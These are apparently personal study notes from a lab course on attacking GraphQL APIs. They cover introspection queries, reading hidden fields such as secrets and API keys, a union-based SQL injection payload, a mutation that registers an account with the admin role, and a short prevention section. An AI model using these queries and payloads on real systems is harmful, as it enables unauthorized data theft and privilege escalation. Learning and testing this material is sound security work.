#CWES #graphql 


#### Intro:
- Alternative to REST API
- basically: If json and sql had a baby, but it was retarded
- Can be vulnerable against XSS, sqli, IDOR, DOS etc

Ex. for query and response:
```
{
  users {
    id
    username
    role
  }
}
```

```
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

#### Attacking graphql by reading data:
- enumerating: https://github.com/dolevf/graphw00f -> path to graphql and the engine used. We can check out the engine here, to better understand what we are dealing with: https://github.com/nicholasaleks/graphql-threat-matrix 

**GraphQL features:**
- Introspection: allows us to query the structure of the backend system, can do so with:
```
{
  __schema {
    types {
      name
    }
  }
}
```
- Say we find a type named "UserObject", then we could use the query below to find the field names and their type for a given schema:
```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

- Then we can find suppoerted queries 
```
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

- We also have a general introspection query:
```
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```


Example:
Say the introspection gave us this field which we are interested in:
```
   {
	  "name": "secrets",
	  "description": null,
	  "args": [],
	  "type": {
		"kind": "LIST",
		"name": null,
		"ofType": {
		  "kind": "OBJECT",
		  "name": "SecretObject",
		  "ofType": null
		}
	  },
```


We see an interesting type "SecretObject" and we want to know which fields it contains:
```
{
  __type(name: "SecretObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

```


```
Response:
{
  "data": {
    "__type": {
      "name": "SecretObject",
      "fields": [
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL"
          }
        },
        {
          "name": "secret",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        }
      ]
    }
  }
}

```
- So there exists 2 fields for this type; "id" and "secret" -> so we query these 

Then we query to display the value:
```
{
  secrets {
    id
    secret
  }
}
```



```
{
  user(username: "x' UNION SELECT 1,2,column_name,4,5,6 FROM information_schema.columns WHERE table_name=flag-- -") {
    username
  }
}
```


#### Attacking graphql by modifying data:
- **First we check out what fields we can mutate:**
```
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
- Then we need to understand how this mutation works, ie what input it needs and if we are allowed to call it:

Say we find this field to mutate:
```
{
  "data": {
    "__schema": {
      "mutationType": {
        "name": "Mutation",
        "fields": [
          {
            "name": "registerUser",
            "args": [
              {
                "name": "input",
                "defaultValue": null,
                "type": {
                  "kind": "NON_NULL",
                  "name": null,
                  "ofType": {
                    "kind": "INPUT_OBJECT",
                    "name": "RegisterUserInput",
                    "ofType": null
                  }
                }
              }
            ]
          }
        ]
      }
    }
  }
}
```


- Then we check mutation-inputs:
```
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

Then send in a mutation, filling out each input:
```
mutation {
  registerUser(input: {username: "bum", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```
- In this case it created a new account with admin privs for us.

#### Automated fuzzing and tools:
- https://github.com/dolevf/graphql-cop -sqlmap for grapql basically

```
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```

- https://github.com/doyensec/inql - burp extension for easier testing
- https://apis.guru/graphql-voyager/ - graphql visualization tool - paste the output of the introspection schema
#### Prevent graphql attacks:
- Disable verbose error messages, and have control over the information one have access to via the api.
- OFC: input sanitaztion 
- DDOS protection: rate limiting queries and max query depth
- Access control on what endpoint different users should be able to access.
More:https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html 



#### Assessment:
Interessting object:
- activeApiKeys

```
{
  __type(name: "ApiKeyObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
- with fields: id, role, key  

Then we query all fields:
```
{
  activeApiKeys
  {
    id
    role
    key
  }
}
```

And find:
```
"id": "QXBpS2V5T2JqZWN0OjM=",
"role": "admin",
"key": "0711a879ed751e63330a78a4b195bbad"
```

- CustomerObject: id, firstname,lastname,address


**Mutatable objects:**
- addEmployee - AddEmployeeInput
- addProduct- AddProductInput
- addCustomer - AddCustomerInput

We then find a poc for sqli in via:
```
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Blair'") {
    firstName
    lastName
    address
  }
}

```

```
SELECT customer.id AS customer_id, customer.`firstName` AS `customer_firstName`, customer.`lastName` AS `customer_lastName`, customer.address AS customer_address \nFROM customer \nWHERE lastName='Blair''
```

- From here we do a normal union based sqli, get the database name, table names, column names

Q: Can we use sqlmap to look for sqli in graphql?